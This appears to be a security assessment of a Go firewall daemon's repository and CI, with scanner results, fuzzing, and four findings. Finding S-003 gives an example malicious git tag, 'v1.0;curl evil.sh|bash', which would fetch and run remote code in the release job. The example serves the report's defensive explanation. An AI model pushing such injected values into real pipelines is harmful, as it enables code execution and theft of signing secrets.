# Security assessment — 2026-11-17

Branch `security/assessment-20261117` off `origin/main` (`e3762564`).
Scope: repository, CI workflows, local test environment. No external
hosts were scanned or contacted.

## Tool outputs

| Tool | Result |
| --- | --- |
| `govulncheck ./...` (go1.27.1) | 11 reachable stdlib vulns (net/http Range-header DoS GO-2026-6609, MaxBytesReader race GO-2026-6859, http2 HPACK races GO-2026-6610/6612/6613, crypto/x509 GO-2026-6809, x/net/html GO-2026-6866…); 2 in imported packages, 12 in required modules not called by this code. |
| `govulncheck ./...` (after S-001) | **No vulnerabilities found.** |
| `go vet ./...` | clean |
| `staticcheck ./...` | 10 minor findings: dead code (`packetAttrsFetcher` unused, `strPtr` unused, `port` unused, SA4006 in tests), SA6002 alloc hint, SA4016 in a test constant, SA1011 invalid-UTF8 arg in a test. None security-relevant. |
| `gosec ./...` | G115×13 (bounded-value casts: queue/ctinfo/enum/ports — false positives, values are UAPI/enum-bounded), G704 SSRF×7 (all in `tests/integration/probe/main.go`, a lab test helper dialing localhost netns — not a product surface), G703/G304 file-read×6 (CLI config path and validated store paths — by design), G301/G302 perms (store dir/files 0755/0644 hold firewall policies, not secrets), G104 unhandled errors (best-effort cleanup paths). |
| `gitleaks detect` (297 commits) | **no leaks found** |
| `trufflehog` | **could not install** — module `replace` directives block `go install`; not run. |
| Fuzzing (60s each) | `FuzzParse` 5.85M execs, `FuzzParseAttrs` 6.04M execs, `FuzzCompile` (new) 682k execs — no panics, no crashes. |

## Findings

| ID | Class / CWE | Severity | Location | Status | Test | Commit |
| --- | --- | --- | --- | --- | --- | --- |
| S-001 | supply chain / unpatched stdlib (CWE-1104) | medium | go.mod (`go 1.25.0`, no toolchain pin) | fixed | `govulncheck` output (11 reachable → 0) | `b69cb0e` |
| S-002 | integer overflow, config validation (CWE-190) | low | `internal/config/config.go:478`, env layer | fixed | `TestValidateQueueNumIPv6Reserved` (failed before) | `880e625` |
| S-003 | CI script injection (CWE-78/CWE-94) | medium | `.github/workflows/release.yml:37,39` — unquoted `make package VERSION=${{ github.ref_name }}` | needs human | mechanical shell demo (see below) | — |
| S-004 | supply chain, mutable container tag | low | `.github/workflows/apk-sign.yml:23` `openwrt/sdk:x86_64-25.12.6` (not digest-pinned) | needs human | — | — |

### S-001 — reachable stdlib vulnerabilities
The API server is an HTTP/1.1 `net/http` server on 127.0.0.1 using
`http.MaxBytesReader` directly (`internal/api/server.go:267`), so the
MaxBytesReader-header race (GO-2026-6859) and the Range-header parsing
limit (GO-2026-6609) are reachable. Fixed by locking `toolchain go1.27.4`
(auto-downloaded by CI via `GOTOOLCHAIN=auto`) and bumping
`golang.org/x/net` v0.62.0 + `golang.org/x/sys` v0.49.0. The `go`
directive rose 1.25.0 → 1.26.0 (required by x/net v0.62.0). CI keeps
`go-version: "1.25"` in setup-go but the toolchain directive makes every
build use go1.27.4.

### S-002 — queue_num 65535 accepted but uninstallable
`queue_num: 65535` passed validation, but the hook always renders an
IPv6 queue rule at `queue_num+1`, producing `queue to 65536` — outside
the u16 queue-number range — so every `nft -f` install fails at startup
(fail-closed, but the config is accepted and then cannot run).
`validate()` and `GOSHISEN_QUEUE_NUM` now bound it to 0..65534.

### S-003 — script injection via tag ref name (needs human)
`release.yml` interpolates `${{ github.ref_name }}` **unquoted** into
`make package VERSION=` and `make verify-package VERSION=`. Git ref
names permit `;` and `$()`; a tag pushed as
`v1.0;curl evil.sh|bash` (or `v1.0$(id)`) would execute attacker
commands in the release job, which holds `contents: write`, the
`GH_RELEASE_SIGNING_KEY` secret, and `GH_TOKEN`. Reproduction of the
mechanism (local, no tag pushed):

```
$ bash -c 'VERSION=v1.0;touch /tmp/pwned2'      # ';' executes
$ git check-ref-format refs/tags/v1.0\;touch-ok  # ';' allowed in refs
```

Trigger requires a user with tag-push rights (a maintainer or a
compromised push credential). **Proposed fix (text only, not applied —
release workflow):** validate the tag name in a first step
(`[[ "${{ github.ref_name }}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]` or fail)
and always quote interpolations (`VERSION="${{ github.ref_name }}"`).
Same pattern in `apk-sign.yml` `case "${{ github.ref }}"` — the value is
quoted there but a `ref`-validation step is recommended.

### S-004 — mutable container image tag (needs human)
`openwrt/sdk:x86_64-25.12.6` (apk-sign.yml) is a mutable tag; a
compromised/republished tag changes the signing environment. Proposed:
pin the image by digest (and keep the syft checksum-verification pattern
already used for tools). CI settings — not changed here.

## Not applicable / not tested

- **CWE-78 command injection (product):** nft programs are built with
  `strings.Builder` and fed via stdin (`nft -f /dev/stdin`), never a
  shell; NAT values are IPv4-validated, ports numeric, `oifname %q`
  quoted. OpenWrt init `render_config` writes UCI values to YAML
  (root-admin input only, no shell).
- **CWE-22 path traversal / zip-slip / symlink:** no tar/zip extraction
  in Go; script verification extracts with `tar -O` (stdout only,
  no writes); `store` versions are validated/numeric; temp files use
  `O_CREATE|O_EXCL` (no symlink overwrite).
- **CWE-502 unsafe deserialization:** YAML with `KnownFields(true)`,
  JSON via `encoding/json` with 16 KiB `MaxBytesReader`; policy compile
  validates before any state change.
- **CWE-367 TOCTOU:** signatures/checksums verified over the exact file
  then used (same path); `apk verify` + sha256 on the same file.
- **TLS (CWE-295/319):** daemon makes no outbound connections; API and
  metrics bind 127.0.0.1 only; CI/downloads use HTTPS; the asset
  fetcher uses urllib's default (verifying) TLS context. Not applicable.
- **Hardcoded credentials / key material:** gitleaks clean over full
  history; `keys/` contains public keys only; signing secrets enter via
  environment, `chmod 600`, removed by trap, never logged
  (`SourceSummary` omits the token).
- **File permissions / privilege:** store dir 0755, policy files 0644 —
  firewall rules, not secrets; daemon runs as root (documented,
  OpenWrt). gosec G301/G302 are informational here.
- **Resource exhaustion:** request bodies bounded (16 KiB), server
  timeouts set, `MaxHeaderBytes` 8 KiB, verdict buffer pooled, kernel
  queue `maxlen` bounded. `fetch-release-asset.py` reads a release
  asset wholly into memory — maintainer-only path, bounded by asset
  size; noted.
- **Integer overflow (CWE-190):** gosec G115 flags are bounded-value
  casts (u16 queue numbers, ctinfo byte, enums, u16 ports after range
  checks); `delta32` handles 32-bit counter wrap; netlink attribute
  lengths validated before slicing. Not applicable.
- **Supply chain:** go.sum + `go mod verify` in CI; syft pinned and
  checksum-verified before use; release archives byte-identical across
  two SDK builds; deps are well-known modules (mdlayher/netlink,
  gopkg.in/yaml.v3 — yaml.v3 is in maintenance mode, no known CVEs per
  govulncheck). Remaining: S-004 container digest.

## Environment note

`internal/hook` nft syntax tests fail on this host (kernel lacks
`NFT_QUEUE`); reproduced on unchanged `origin/main`, passes in CI. Not a
finding (see `docs/audit-self-review-20261117.md`).
